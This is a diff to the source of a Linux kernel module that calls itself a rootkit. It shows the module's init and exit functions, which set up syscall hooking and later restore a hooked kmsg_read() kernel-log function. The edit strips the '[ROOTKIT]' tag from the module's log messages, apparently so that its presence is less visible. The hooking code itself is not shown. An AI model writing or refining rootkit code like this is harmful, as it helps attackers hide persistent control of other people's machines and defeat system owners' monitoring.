@@ -21,14 +21,14 @@ static int __init rootkit_init(void)
 {
     int i32_err;
 
-    pr_info("[ROOTKIT] Module loading...\n");
-    pr_info("[ROOTKIT] * Module: %s (v%s)\n", THIS_MODULE->name, THIS_MODULE->version);
+    pr_dev_info("Module loading...\n");
+    pr_dev_info("* Module: %s (v%s)\n", THIS_MODULE->name, THIS_MODULE->version);
 
     // Initialize hooking
     i32_err = init_hooking();
 
     IF_U (i32_err != 0) {
-        pr_err("[ROOTKIT] Failed to initialize hooking\n");
+        pr_dev_err("Failed to initialize hooking\n");
         return i32_err;
     }
 
@@ -37,7 +37,7 @@ static int __init rootkit_init(void)
 
     hook_syscalls(P_SYSCALL_HOOKS);
 
-    pr_info("[ROOTKIT] Module loaded\n");
+    pr_dev_info("Module loaded\n");
     return 0;
 }
 
@@ -55,7 +55,7 @@ static __exit void rootkit_exit(void)
     // Restore the original `kmsg_read()` function
     restore_kmsg_read();
 
-    pr_info("[ROOTKIT] Module unloaded\n");
+    pr_dev_info("Module unloaded\n");
     return;
 }
 
